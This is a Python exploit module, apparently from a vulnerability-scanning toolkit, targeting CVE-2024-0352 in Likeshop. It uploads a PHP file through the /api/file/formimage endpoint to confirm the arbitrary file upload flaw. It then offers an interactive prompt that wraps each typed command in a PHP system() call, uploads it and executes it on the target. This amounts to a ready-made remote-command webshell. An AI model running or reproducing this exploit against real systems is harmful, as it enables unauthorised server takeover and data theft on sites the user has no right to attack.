#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3,json
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
import string,random
from urllib.parse import urljoin

urllib3.disable_warnings()

class Cve_2024_0352:
    def generate_random_string(self,length):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for _ in range(length))
        return random_string

    def check(self,url):
        url = url.rstrip("/")
        target = urljoin(url, "/api/file/formimage")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
        }
        test_php_data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file";filename="{{filename}}.php"\r\nContent-Type: application/x-php\r\n\r\n<?php echo md5(123456);unlink(__FILE__);?>\r\n------WebKitFormBoundarygcflwtei--"""
        try:
            upresponse = requests.post(target, headers=headers, data=test_php_data, verify=self.ssl,proxies=self.proxy)
            if upresponse.status_code == 200 and 'uploads' in upresponse.text and '.php' in upresponse.text:
                json_data = json.loads(upresponse.text)
                base_url = json_data["data"]["base_url"]
                text_url = urljoin(url, '/' + base_url)
                text_response = requests.get(text_url, verify=self.ssl,proxies=self.proxy)
                if text_response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in text_response.text:
                    OutPrintInfoSuc("Likeshop", f'目标存在CVE-2024-0352任意文件上传漏洞: {url}')
                    if self.batch:
                        OutPutFile("byzoro_smart_2024_0939.txt", f'目标存在CVE-2024-0352任意文件上传漏洞: {url}')
                    return True
                else:
                    if not self.batch:
                        OutPrintInfo("Likeshop", f'目标不存在CVE-2024-0352任意文件上传漏洞')
            else:
                if not self.batch:
                    OutPrintInfo("Likeshop", f'目标不存在CVE-2024-0352任意文件上传漏洞')
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Likeshop", f'目标请求出错')

    def run(self,url):
        url = url.rstrip("/")
        target = urljoin(url, "/api/file/formimage")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
        }
        if self.check(url):
            while True:
                command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                shell = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file";filename="{{filename}}.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system(\'{}\');unlink(__FILE__);?>\r\n------WebKitFormBoundarygcflwtei--""".format(
                    command)
                if "exit" not in command:
                    try:
                        upresponse = requests.post(target, verify=self.ssl,proxies=self.proxy, headers=headers, data=shell, timeout=15)
                        if upresponse.status_code == 200 and 'uploads' in upresponse.text and '.php' in upresponse.text:
                            json_data = json.loads(upresponse.text)
                            base_url = json_data["data"]["base_url"]
                            text_url = urljoin(url, '/' + base_url)
                            text_response = requests.get(text_url, verify=self.ssl,proxies=self.proxy)
                            if text_response.status_code == 200:
                                OutPrintInfoSuc("Likeshop",f"响应:\n{text_response.text.strip()}")
                    except Exception as e:
                        OutPrintInfo("Likeshop", f'目标请求出错')
                else:
                    OutPrintInfo("Likeshop", "The tested webshell has been automatically deleted")
                    break

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Likeshop", '开始检测CVE-2024-0352任意文件上传漏洞...')
        if self.check(url):
            if not self.batch:
                self.run(url)
        if not self.batch:
            OutPrintInfo("Likeshop", 'CVE-2024-0352任意文件上传漏洞检测结束')

